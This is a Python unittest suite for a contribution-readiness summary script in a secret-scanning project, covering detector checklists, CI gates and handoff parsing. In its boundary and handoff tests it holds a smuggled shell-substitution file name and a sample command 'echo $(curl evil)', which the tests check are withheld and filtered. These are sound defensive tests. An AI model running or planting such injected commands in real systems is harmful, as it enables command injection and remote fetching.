#!/usr/bin/env python3
"""Contribution-readiness summary (issue #1051): synthetic file lists, no git."""

from __future__ import annotations

import contextlib
import importlib.util
import io
import json
import sys
import tempfile
import unittest
from pathlib import Path

SCRIPT = Path(__file__).resolve().parents[1] / "contribution-readiness.py"
spec = importlib.util.spec_from_file_location("contribution_readiness", SCRIPT)
assert spec and spec.loader
cr = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = cr  # dataclasses resolve their module by name
spec.loader.exec_module(cr)

NEW_DETECTOR = "crates/secret-scan-core/src/detectors/example_provider.rs"
REGISTRY = "crates/secret-scan-core/src/detectors/mod.rs"


def report(lines: list[str], **kwargs) -> tuple[object, str]:
    result = cr.evaluate(cr.parse_changes(lines), **kwargs)
    return result, cr.render(result)


def complete_detector() -> list[str]:
    return [
        f"A {NEW_DETECTOR}",
        f"M {REGISTRY}",
        f"M {cr.INVENTORY}",
        f"M {cr.CORPUS}",
        *[f"M {path}" for path in cr.INVENTORY_DOCS + cr.COVERAGE_REPORTS],
    ]


class IncompleteDetector(unittest.TestCase):
    def test_a_bare_new_detector_names_every_missing_artifact_and_command(self) -> None:
        result, text = report([f"A {NEW_DETECTOR}"])
        self.assertTrue(result.pending)
        self.assertEqual(result.stage, "implementation-ready")
        self.assertIn("new detector module is not registered", text)
        self.assertIn("policy classification missing", text)
        self.assertIn("synchronous conformance fixture missing", text)
        self.assertIn("no deterministic test in the diff", text)
        self.assertIn("changelog coverage missing", text)
        self.assertIn(f"run: {cr.CHECK_FIXTURE}", text)
        self.assertIn("run: python3 -B scripts/check-changelog-coverage.py --base origin/main", text)
        self.assertIn(f"run: {cr.INVENTORY_TEST}", text)

    def test_a_stale_generated_inventory_names_the_generators(self) -> None:
        changes = [
            f"A {NEW_DETECTOR}",
            f"M {REGISTRY}",
            f"M {cr.INVENTORY}",
            f"M {cr.CORPUS}",
        ]
        _, text = report(changes, changelog_updated=True)
        self.assertIn("generated detector inventory docs are stale", text)
        self.assertIn("generated coverage reports are stale", text)
        for command in cr.INVENTORY_DOC_COMMANDS + cr.COVERAGE_COMMANDS:
            self.assertIn(f"run: {command}", text)
        self.assertNotIn("changelog coverage missing", text)

    def test_missing_changelog_alone_is_the_only_action(self) -> None:
        result, text = report(complete_detector())
        self.assertEqual(
            [row.text for s in result.sections for row in s.rows if not row.ok][0][:19], "changelog coverage "
        )
        self.assertEqual(text.count(cr.TODO), 1)


class CompleteDetector(unittest.TestCase):
    def test_a_complete_detector_is_the_reverse_handoff(self) -> None:
        result, text = report(complete_detector(), changelog_updated=True)
        self.assertFalse(result.pending)
        self.assertEqual(result.stage, "verification-needed")
        self.assertNotIn(cr.TODO, text)
        self.assertIn("Funnel stage: verification-needed", text)

    def test_the_waiver_label_satisfies_the_changelog_row(self) -> None:
        result, _ = report(complete_detector(), labels=["no-changelog"])
        self.assertFalse(result.pending)

    def test_a_changed_existing_detector_needs_no_registration_or_policy_row(self) -> None:
        changes = [f"M {NEW_DETECTOR}", f"M {cr.CORPUS}", *[f"M {p}" for p in cr.COVERAGE_REPORTS]]
        _, text = report(changes, changelog_updated=True)
        self.assertNotIn("registered", text)
        self.assertNotIn("policy classification", text)


class OtherClasses(unittest.TestCase):
    def test_docs_only_asks_for_the_docs_check_and_no_changelog(self) -> None:
        result, text = report(["M README.md", "M docs/guides/reporting-detection-issues.md"])
        self.assertFalse(result.pending)
        self.assertEqual(result.stage, "")
        self.assertIn(f"scoped check: {cr.CHECK_DOCS}", text)
        self.assertIn("no changelog entry required", text)

    def test_a_code_change_is_not_docs_only(self) -> None:
        _, text = report(["M README.md", f"M {NEW_DETECTOR}"])
        self.assertNotIn("Documentation only", text)

    def test_a_fixture_change_names_stale_coverage_reports(self) -> None:
        _, text = report([f"M {cr.CORPUS}"])
        self.assertIn("Conformance fixture", text)
        self.assertIn("generated coverage reports are stale", text)
        self.assertIn(f"scoped check: {cr.CHECK_FIXTURE}", text)

    def test_a_benchmark_regression_needs_its_canonical_fixture_and_stays_verification_needed_until_measured(
        self,
    ) -> None:
        result, text = report([f"M {cr.REGRESSIONS}"])
        self.assertIn(f"minimal canonical regression missing from {cr.CORPUS}", text)
        self.assertEqual(result.stage, "implementation-ready")
        done, done_text = report([f"M {cr.REGRESSIONS}", f"M {cr.CORPUS}", *[f"M {p}" for p in cr.COVERAGE_REPORTS]])
        self.assertEqual(done.stage, "verification-needed")
        self.assertIn("stays verification-needed", done_text)

    def test_a_workflow_change_without_the_sast_baseline_names_the_sast_command(self) -> None:
        _, text = report(["M .github/workflows/ci.yml"])
        self.assertIn("run: python3 -B scripts/run-sast.py", text)
        self.assertIn(f"scoped check: {cr.CHECK_RELEASE}", text)
        _, rekeyed = report(["M .github/workflows/ci.yml", f"M {cr.SAST_BASELINE}"])
        self.assertNotIn("scripts/run-sast.py", rekeyed)

    def test_pin_source_without_manifest_is_flagged(self) -> None:
        _, text = report([f"M {cr.PIN_SOURCE}"])
        self.assertIn("run: npm run benchmark-pins:check", text)
        _, both = report([f"M {cr.PIN_SOURCE}", f"M {cr.PIN_MANIFEST}"])
        self.assertNotIn(cr.TODO, both)

    def test_an_empty_diff_reports_no_class(self) -> None:
        _, text = report([])
        self.assertIn("No contribution class detected", text)
        self.assertNotIn(cr.TODO, text)


class Gates(unittest.TestCase):
    def test_a_failed_gate_is_reported_with_its_command_and_blocks_the_reverse_handoff(self) -> None:
        result, text = report(complete_detector(), changelog_updated=True, gates={"test": "failure", "lint": "success"})
        self.assertEqual(result.stage, "implementation-ready")
        self.assertIn("CI gate `test` failure; the gate itself is authoritative", text)
        self.assertIn("run: npm run check:changed", text)
        self.assertIn("gates passed: lint", text)

    def test_skipped_gates_are_neither_passed_nor_failed(self) -> None:
        result, _ = report([], gates={"changelog-coverage": "skipped"})
        self.assertEqual(result.gates, [])

    def test_gate_values_are_validated(self) -> None:
        self.assertEqual(cr.parse_gates(["test=success"]), {"test": "success"})
        with self.assertRaises(SystemExit):
            cr.parse_gates(["test=maybe"])
        with self.assertRaises(SystemExit):
            cr.parse_gates(["Not A Job=success"])


class Boundaries(unittest.TestCase):
    def test_output_is_deterministic_and_order_independent(self) -> None:
        lines = complete_detector()
        self.assertEqual(report(lines)[1], report(list(reversed(lines)))[1])

    def test_unsafe_path_names_are_withheld(self) -> None:
        odd = "crates/secret-scan-core/src/detectors/x y;$(z).rs"
        _, text = report([f"A {odd}"])
        self.assertNotIn("$(z)", text)
        self.assertIn("<path withheld>", text)

    def test_long_file_lists_are_capped(self) -> None:
        lines = [f"M crates/secret-scan-core/src/detectors/p{i}.rs" for i in range(9)]
        _, text = report(lines)
        self.assertIn("(+5 more)", text)

    def test_the_summary_always_states_it_is_not_a_gate(self) -> None:
        for lines in ([], [f"A {NEW_DETECTOR}"]):
            self.assertIn("This summary reports only.", report(lines)[1])

    def test_main_exits_zero_for_an_incomplete_diff(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            paths = Path(directory) / "changes.txt"
            paths.write_text(f"A {NEW_DETECTOR}\n", encoding="utf-8")
            with contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(cr.main(["--paths", str(paths)]), 0)

    def test_step_summary_appends_only_when_asked_and_set(self) -> None:
        import os

        with tempfile.TemporaryDirectory() as directory:
            paths = Path(directory) / "changes.txt"
            paths.write_text("M README.md\n", encoding="utf-8")
            summary = Path(directory) / "summary.md"
            previous = os.environ.get("GITHUB_STEP_SUMMARY")
            os.environ["GITHUB_STEP_SUMMARY"] = str(summary)
            try:
                with contextlib.redirect_stdout(io.StringIO()):
                    cr.main(["--paths", str(paths)])
                    self.assertFalse(summary.exists())
                    cr.main(["--paths", str(paths), "--step-summary"])
            finally:
                if previous is None:
                    del os.environ["GITHUB_STEP_SUMMARY"]
                else:
                    os.environ["GITHUB_STEP_SUMMARY"] = previous
            text = summary.read_text(encoding="utf-8")
            self.assertTrue(text.startswith("```text\nContribution readiness"))
            self.assertTrue(text.endswith("```\n"))


class Handoff(unittest.TestCase):
    def test_only_state_route_and_safe_commands_are_read(self) -> None:
        document = {
            "state": "implementation-ready",
            "identity": {"route": "new-detector", "family": "must-not-print"},
            "positives": ["must-not-print"],
            "commands": ["npm run check:detector", "echo $(curl evil)"],
        }
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "x.handoff.json"
            path.write_text(json.dumps(document), encoding="utf-8")
            lines = cr.read_handoff(path)
        self.assertEqual(
            lines,
            [
                "handoff state: implementation-ready",
                "handoff route: new-detector",
                "handoff command: npm run check:detector",
            ],
        )

    def test_an_unreadable_handoff_is_reported_not_raised(self) -> None:
        self.assertEqual(cr.read_handoff(Path("/nonexistent/x.handoff.json")), ["handoff file unreadable"])


if __name__ == "__main__":
    unittest.main()
